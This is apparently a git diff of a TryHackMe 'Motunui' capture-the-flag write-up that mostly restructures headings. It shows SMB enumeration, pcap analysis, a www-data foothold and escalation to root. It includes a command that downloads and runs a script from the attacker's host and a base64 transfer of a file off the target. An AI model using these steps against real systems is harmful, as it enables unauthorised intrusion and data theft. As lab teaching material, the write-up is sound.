@@ -19,13 +19,15 @@ Access it <a href="https://tryhackme.com/room/motunui">here</a>.<br>
 - [Port Scanning](#1)<br>  
 - [Web Vulberability Scanning](#2)<br>
 - [SMB Enumeration](#3)<br>
-- [Traffic Inspection](#4)<br>
-- [Static Host Mapping](#5)<br>
-- [Web Interface Inspection](#6)<br>
-- [Web Interface Inspection, Weaponization, Delivery & Execution](#7)<br>
-- [Initial Foothold](#8)<br>
-- [Privilege Escalation & User Flag](#9)<br>
-- [Privilege Escalation & Root Flag](#10)</p>
+- [Static Host Mapping](#4)<br>
+- [Web Interface Inspection](#5)<br>
+- [Directory and File Enumeration](#6)<br>
+- [Web Interface Inspection](#7)<br>
+- [Static Host Mapping](#8)<br>
+- [Weaponization, Delivery & Execution](#9)<br>
+- [Initial Foothold](#10)<br>
+- [Privilege Escalation & User Flag](#11)<br>
+- [Privilege Escalation & Root Flag](#12)</p>
 
 <br>
 <br>
@@ -236,6 +238,7 @@ Host script results:
 
 <br>
 <h1 align="center">SMB Enumeration<a id='3'></a></h1>
+<p align="center">enum4linux</p>
 
 ```bash
 :~/Motunui# enum4linux xx.xxx.xxx.x
@@ -371,8 +374,7 @@ enum4linux complete on Wed Oct  8 xx:xx:xx 2025
 ```
 
 <br>
-<br>
-<br>
+<p align="center">smbclient<br> Identified <ins>print$</ins>, <ins>traces</ins>, and <ins>IPC$</ins>.</p>
 
 ```bash
 :~/Motunui# smbclient -L xx.xxx.xxx.x -N
@@ -385,7 +387,8 @@ enum4linux complete on Wed Oct  8 xx:xx:xx 2025
 SMB1 disabled -- no workgroup available
 ```
 
-<p align="center">ticket_6746.pcapng</p>
+<br>
+<p align="center">smbmap<br>Downloaded <ins>ticket_6746.pcapng</ins>.</p>
 
 ```bash
 :~/Motunui# smbmap -H xx.xxx.xxx.x -u guest -p ' '
@@ -446,8 +449,7 @@ smb: \tui\> ls
 ```
 
 <br>
-<h1 align="center">Traffic Inspection<a id='4'></a></h1>
-<p align="center">Identified:<br><ins>dashboard.png</ins>.<br>Client Hello www.jake-ruston.com<br>Server Hello, Change Cipher<br>A    0x4f1e 0x079d 0x0a06 0x8653<br>AAAA 0x6d1c 0xe69f 0x9e04 0x8d51</p>
+<p align="center">wireshark<br>Analyzed <ins>ticket_6746.pcapng</ins>.<br>Identified:<br><ins>dashboard.png</ins>.<br>Client Hello www.jake-ruston.com<br>Server Hello, Change Cipher<br>A    0x4f1e 0x079d 0x0a06 0x8653<br>AAAA 0x6d1c 0xe69f 0x9e04 0x8d51</p>
 
 <img width="1164" height="198" alt="image" src="https://github.com/user-attachments/assets/5c1b3184-c41a-429d-82d7-ff2ecd9bdc71" />
 
@@ -461,21 +463,17 @@ smb: \tui\> ls
 <br>
 <br>
 
-<p align="center">dashborad.png:<br>d3v3lopm3nt.motonui.thm<br>The pages included on this virtual host are solely for developers of Motunui. Please ensure you have authorisation  to ve viewing this.</p>
+<p align="center">Opened <ins>dashborad.png</ins> which contains:<br><code>d3v3lopm3nt.motonui.thm</code><br> and <em></em>The pages included on this virtual host are solely for developers of Motunui. Please ensure you have authorisation  to ve viewing this</em>.</p>
 
 <img width="1223" height="196" alt="image" src="https://github.com/user-attachments/assets/02dffd6c-d835-4591-a7d5-c0b5aac02cc8" />
 
 <br>
 <br>
 <br>
+<h1 align="center">Static Host Mapping<a id='4'></a></h1>
 
 ```bash
-GET /dashboard.png HTTP/1.1
-User-Agent: Wget/1.20.3 (linux-gnu)
-Accept: */*
-Accept-Encoding: identity
-Host: xxx.xxx.xxx.xxx:8000
-Connection: Keep-Alive
+xx.xxx.xxx.x d3v3lopm3nt.motunui.thm motonui.thm
 ```
 
 <br>
@@ -488,6 +486,7 @@ Connection: Keep-Alive
 <br>
 <br>
 <br>
+<h1 align="center">Directory and File Enumeration<a id='6'></a></h1>
 <p align="center">d3v3lopm3nt.motunui.thm<br>/index.php  .  /docs</p>
   
 ```bash
@@ -610,7 +609,7 @@ xx.xxx.xxx.x d3v3lopm3nt.motunui.thm api.motonui.thm
 ```
 
 <br>
-<h1 align="center">Web Interface Inspection<a id='9'></a></h1>
+<h1 align="center">Weaponization, Delivery & Execution<a id='9'></a></h1>
 <p align="center">api.motonui.thm:3000/v2/login</p>
 
 ```bash
@@ -706,6 +705,9 @@ Content-Type: application/x-www-form-urlencoded
 <br>
 <br>
 
+<br>
+<h1 align="center">Initial Foothold<a id='10'></a></h1>
+
 ```bash
 www-data@motunui:/home$ ls
 moana  network
@@ -719,8 +721,6 @@ But will you please consider not using the same password for all services? It pu
 
 I have started planning the new network design in packet tracer, and since you're 'the best engineer this island has seen', go find it and finish it.
 ```
-
-
 
 ```bash
 www-data@motunui:/home/moana$ cat user.txt
@@ -764,15 +764,15 @@ www-data@motunui:/etc$ python3 -m http.server
 100 48875  100 48875    0     0   215k      0 --:--:-- --:--:-- --:--:--  215k
 ```
 
-
-
 ```bash
 www-data@motunui:~$ wget http://10.8.106.222/lse.sh && chmod +x lse.sh && ./lse.sh -i -l 1
 ```
 
-
 <img width="1150" height="455" alt="image" src="https://github.com/user-attachments/assets/de88c9d6-b8ab-4f93-8e62-e7cde4136b49" />
 
+<br>
+<br>
+<br>
 
 ```bash
 [!] ret010 Cron tasks writable by user..................................... yes!
@@ -807,19 +807,18 @@ www-data@motunui:~$ wget http://10.8.106.222/lse.sh && chmod +x lse.sh && ./lse.
 /var/spool/cron/crontabs/www-data
 ```
 
+<br>
+<br>
 
 ```bash
 www-data@motunui:/etc$ file network.pkt
 network.pkt: data
 ```
 
-
 ```bash
 www-data@motunui:/$ cat /etc/network.pkt | base64 -w0
 echo 'KZmbEVo1fGVJYkpMfrksjpipEacTcu1HwSeJJVV+M1aI0edduX21Y1XDrxmiDoCr8aiDsrUNAyX9EWWhZweq9/ewakdZdNq6aujdseMeK1TodMr2UMX...' > file
 ```
-
-<br>
 
 ```bash
 :~/Motunui# file file
@@ -830,10 +829,8 @@ file: ASCII text, with very long lines
 :~/Motunui# base64 --decode file > t.pkt
 ```
 
-<br>
-
 ```bash
-:~/Motunui# $ $ file t.pkt
+:~/Motunui# file t.pkt
 t.pkt: data
 ```
 
@@ -855,8 +852,8 @@ t.pkt: data
 <br>
 <br>
 <br>
-
-<p align="center">SSH with the credentials just discovered.<br>moana:············
+<h1 align="center">Privilege Escalation & User Flag<a id='11'></a></h1>
+<p align="center">SSH with the credentials just discovered.<br>'moana':'············'</p>
 
 ```bash
 moana@motunui:~$ cat user.txt
@@ -866,6 +863,7 @@ THM{*****_**_*******}
 <br>
 <p>1.1. What is the user flag?<br>
 <code>THM{*****_**_*******}</code></p>
+<br>
 <br>
 
 ```bash
@@ -1011,7 +1009,6 @@ moana@motunui:~$ ls -la /etc/systemd/system/multi-user.target.wants/api.service
 lrwxrwxrwx 1 root root 31 Jul  9  2020 /etc/systemd/system/multi-user.target.wants/api.service -> /etc/systemd/system/api.service
 ```
 
-
 ```bash
 moana@motunui:~$ cat /etc/systemd/system/multi-user.target.wants/api.service
 [Unit]
@@ -1028,7 +1025,6 @@ RestartSec=5
 WantedBy=multi-user.target
 ```
 
-
 ```bash
 moana@motunui:~$ ls -la /var/www/api.motunui.thm/server.js
 -rw-r--r-- 1 www-data www-data 2330 Aug  3  2020 /var/www/api.motunui.thm/server.js
@@ -1038,8 +1034,8 @@ moana@motunui:~$ ls -la /var/www/api.motunui.thm/server.js
 xx.xxx.xxx.x    d3v3lopm3nt.motunui.thm api.motunui.thm dev.motunui.thm
 ```
 
-
-<p>server.js</p>
+<br>
+<p align="center">server.js</p>
 
 ```bash
 const connect = require('connect');
@@ -1128,6 +1124,7 @@ app.use(vhost('api.motunui.thm', (req, res) => {
 app.listen(3000);
 ```
 
+<br>
 <p>/etc/ssl.txt</p>
 
 ```bash
@@ -1151,8 +1148,8 @@ SSLKEYLOGFILE=/etc/ssl.txt
 LOGNAME=moana
 ```
 
-
-
+<br>
+<p> align="center">Saved <ins>ssl.txt</ins> content.</p>
 
 ```bash
 moana@motunui:/etc$ cat ssl.txt
@@ -1160,10 +1157,10 @@ CLIENT_RANDOM 432738e149bdfb67ce70ca989045c1f2f75...57f38e1ed457295 ee0b4...36f5
 ...
 ```
 
-
-
-
-
+<br>
+<br>
+<br>
+<h1 align="center">Privilege Escalation & Root Flag<a id='12'></a></h1>
 
 <img width="1275" height="716" alt="image" src="https://github.com/user-attachments/assets/20146398-5ba6-49b2-8431-03919299639f" />
 
@@ -1172,19 +1169,27 @@ CLIENT_RANDOM 432738e149bdfb67ce70ca989045c1f2f75...57f38e1ed457295 ee0b4...36f5
 :~/Motunui# ssh root@api.motunui.thm
 root@api.motunui.thm's password: 
 ...
+```
+
+```bash
 root@motunui:~# id
 uid=0(root) gid=0(root) groups=0(root)
+```
+
+```bash
 root@motunui:~# pwd
 /root
+```
+
+```bash
 root@motunui:~# ls
 root.txt
+```
+
+```bash
 root@motunui:~# cat root.txt
 THM{*****_********}
 ```
-
-
-
-
 
 <br>
 <br>
